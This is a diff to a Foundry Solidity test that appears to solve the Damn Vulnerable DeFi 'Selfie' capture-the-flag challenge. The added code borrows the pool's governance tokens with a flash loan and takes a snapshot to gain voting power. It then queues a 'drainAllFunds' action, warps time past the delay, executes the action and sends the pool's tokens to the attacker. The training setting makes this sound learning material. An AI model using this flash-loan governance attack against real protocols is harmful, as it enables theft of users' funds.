@@ -45,9 +45,34 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        // Queue action
+        uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
+        selfiePool.flashLoan(amount);
 
+        // Warp timestamp by computing target time
+        bytes32 location = bytes32(
+            uint256(keccak256(abi.encode(uint256(1), uint256(1)))) + 3 // actions[1].proposedAt
+        );
+        uint256 proposedAt = uint256(
+            vm.load(address(simpleGovernance), location)
+        );
+        vm.warp(proposedAt + simpleGovernance.getActionDelay());
+
+        // Execute action after delay
+        simpleGovernance.executeAction(1);
+        dvtSnapshot.transfer(address(attacker), amount);
         /** EXPLOIT END **/
         validation();
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        dvtSnapshot.snapshot(); // Snapshot the received dvt tokens
+        bytes memory data = abi.encodeWithSignature(
+            "drainAllFunds(address)",
+            address(this)
+        );
+        simpleGovernance.queueAction(address(selfiePool), data, 0);
+        dvtSnapshot.transfer(address(selfiePool), amount);
     }
 
     function validation() internal {
